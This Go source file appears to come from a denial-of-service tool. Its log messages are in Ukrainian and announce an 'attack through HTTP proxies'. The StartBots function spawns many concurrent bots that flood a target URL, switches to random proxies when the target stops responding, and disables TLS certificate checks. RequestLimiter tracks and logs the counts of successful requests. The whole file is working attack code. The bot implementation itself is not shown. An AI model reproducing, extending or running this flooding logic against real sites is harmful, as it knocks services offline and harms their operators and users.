package pkg

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"sync"
	"time"

	log "github.com/sirupsen/logrus"
)

var DefClient *http.Client

func init() {
	// Setup
	rand.Seed(time.Now().UnixNano())
	// Default http client
	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	tr.IdleConnTimeout = time.Second * 5
	tr.ResponseHeaderTimeout = time.Second * 5
	tr.MaxConnsPerHost = 0 // no limit
	tr.ReadBufferSize = 100
	DefClient = &http.Client{Transport: tr}
	// Logger
	log.SetFormatter(&log.TextFormatter{
		TimestampFormat: "2006-01-02 15:04:05",
		FullTimestamp:   true,
	})
}

func StartBots(ctx context.Context, wg *sync.WaitGroup, data *TargetData, numOfBots, maxErrCount int, counter chan<- bool) error {
	_, err := url.ParseRequestURI(data.Site.URL)
	if err != nil {
		return fmt.Errorf("on parsing target url: %w", err)
	}

	ctxTimeout, cancel := context.WithTimeout(ctx, time.Second*5)
	defer cancel()

	req, err := newGetReq(ctxTimeout, data.Site.URL)
	if err != nil {
		return fmt.Errorf("on creaing a request: %w", err)
	}

	resp, err := DefClient.Do(req)
	if err != nil {
		log.Warnf("Надсилаючи запит без проксі: %v\n", err)
	} else {
		toDevNull(resp.Body)
	}

	withProxy := false
	getPoxy := func() *Proxy {
		if withProxy {
			return &data.Proxies[rand.Intn(len(data.Proxies)-1)]
		}
		return nil
	}

	if err != nil || resp.StatusCode != http.StatusOK {
		if len(data.Proxies) == 0 {
			return fmt.Errorf("знайдено 0 проксі")
		}

		withProxy = true
		log.Infoln("Починаємо атаку через HTTP проксі :)")
	}

	// TODO: handle errors && and  statisics
	for id := 0; id < numOfBots; id++ {
		select {
		case <-ctx.Done():
			return nil
		default:
			go func(id int) {
				proxy := getPoxy()
				log := log.WithField("bot", id)

				c, err := NewBot(ctx, id, proxy, false)
				if err != nil {
					log.Infof("Під час створення бота: %v\n", err)
					return
				}

				wg.Add(1)
				c.Start(ctx, data.Site.URL, maxErrCount, counter)
				wg.Done()
			}(id)
		}
	}

	return nil
}

func RequestLimiter(ctx context.Context, termBots func(), wg *sync.WaitGroup, reqPerEpoch int, counter <-chan bool) {
	wg.Add(1)
	defer wg.Done()
	totalRequstSent, successRequestSent := 0, 0
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		select {
		case <-ctx.Done():
			return
		case v := <-counter:
			totalRequstSent++
			if v {
				successRequestSent++
			}

			if totalRequstSent%100 == 0 {
				log.Infof("Успішних запитів: %d/%d\n", successRequestSent, totalRequstSent)
			}

			if reqPerEpoch != 0 && totalRequstSent > reqPerEpoch {
				termBots()
				return
			}
		}
	}
}
